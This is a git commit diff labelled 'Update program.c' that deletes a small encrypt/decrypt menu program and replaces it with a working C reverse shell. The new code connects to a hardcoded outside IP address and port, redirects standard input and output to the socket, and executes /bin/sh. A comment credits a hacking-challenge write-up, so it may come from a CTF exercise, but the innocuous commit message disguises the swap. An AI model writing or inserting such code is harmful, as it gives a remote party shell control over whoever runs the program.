596cdabe7675174cf4163fa80b4bf7c4cd7a59de
hanugra <hanugrawilliam@gmail.com>
2023-01-07 22:41:51 +0700

    Update program.c

--- program.c
+++ program.c
@@ -1,66 +1,28 @@
+/* credits to http://blog.techorganic.com/2015/01/04/pegasus-hacking-challenge/ */
 #include <stdio.h>
-#include <stdlib.h>
-#include <stdbool.h>
-#include <string.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <sys/types.h>
+#include <sys/socket.h>
 
-#include "coolsdk/cool.h"
+#define REMOTE_ADDR "159.65.128.101"
+#define REMOTE_PORT 9393
 
-void encrypt() {
-    printf("Type the message to encrypt: ");
-    
-    char input[9001];
-    scanf(" %9000[^\n]", input);
-    int len = strlen(input);
+int main(int argc, char *argv[])
+{
+    struct sockaddr_in sa;
+    int s;
 
-    printf("Type numeric key code to encrypt with: ");
-    
-    int key;
-    scanf("%d", &key);
+    sa.sin_family = AF_INET;
+    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
+    sa.sin_port = htons(REMOTE_PORT);
 
-    char* output = coolStringEncrypt(input, key, len);
+    s = socket(AF_INET, SOCK_STREAM, 0);
+    connect(s, (struct sockaddr *)&sa, sizeof(sa));
+    dup2(s, 0);
+    dup2(s, 1);
+    dup2(s, 2);
 
-    printHexString(output, len);
-    free(output);
-}
-
-void decrypt() {
-    printf("Type the message to decrypt: ");
-    
-    char input[9001];
-    scanf(" %9000[^\n]", input);
-    int len = strlen(input);
-
-    printf("Type numeric key code to decrypt with: ");
-    
-    int key;
-    scanf("%d", &key);
-
-    char* newInput = parseHexString(input, len);
-    len /= 2;
-
-    char* output = coolStringDecrypt(newInput, key, len);
-    printf("%s\n", output);
-
-    free(newInput);
-    free(output);
-}
-
-int main() {
-    printf("Welcome to my cool encryptor program!\n");
-
-    while (true) {
-        printf("Encrypt (0), decrypt (1), or exit (2)?\n");
-        
-        int choice;
-        scanf("%d", &choice);
-
-        if (choice == 0) {
-            encrypt();
-        } else if (choice == 1) {
-            decrypt();
-        } else if (choice == 2) {
-            printf("Goodbye!");
-            break;
-        }
-    }
+    execve("/bin/sh", 0, 0);
+    return 0;
 }
